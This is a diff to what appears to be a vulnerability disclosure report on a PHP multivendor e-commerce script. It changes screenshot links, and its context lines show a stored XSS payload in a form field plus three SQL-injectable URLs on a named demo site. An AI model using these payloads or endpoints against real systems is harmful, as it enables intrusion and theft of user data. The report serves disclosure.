@@ -57,7 +57,9 @@ Content-Disposition: form-data; name="companyname"
 abc pvt ltd'"><svg/onload=alert(document.cookie)><'"
 ```
 
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Readymade-Video-Sharing-Script/xss3.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sxss.png)
+
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sxss2.png)
 
 
 #### SQL Injection:
@@ -67,7 +69,7 @@ abc pvt ltd'"><svg/onload=alert(document.cookie)><'"
 http://www.fxwebsolution.com//demo/arthi/multivendor/seller-view.php?usid=60
 ```
 
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sqli.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sqli1.png)
 
 ##### sqli2
 
@@ -75,7 +77,7 @@ http://www.fxwebsolution.com//demo/arthi/multivendor/seller-view.php?usid=60
 http://www.fxwebsolution.com/demo/arthi/multivendor/shopping-cart.php?cusid=60
 ```
 
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sql2.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sqli2.png)
 
 
 ##### sqli3
@@ -84,7 +86,7 @@ http://www.fxwebsolution.com/demo/arthi/multivendor/shopping-cart.php?cusid=60
 http://www.fxwebsolution.com/demo/arthi/multivendor/my_wishlist.php?fid=60
 ```
 
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sql3.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/PHP-Multivendor-Ecommerce/sqli3.png)
 
 
 You can see,  we can obtain the current data user or more sensitive data now!
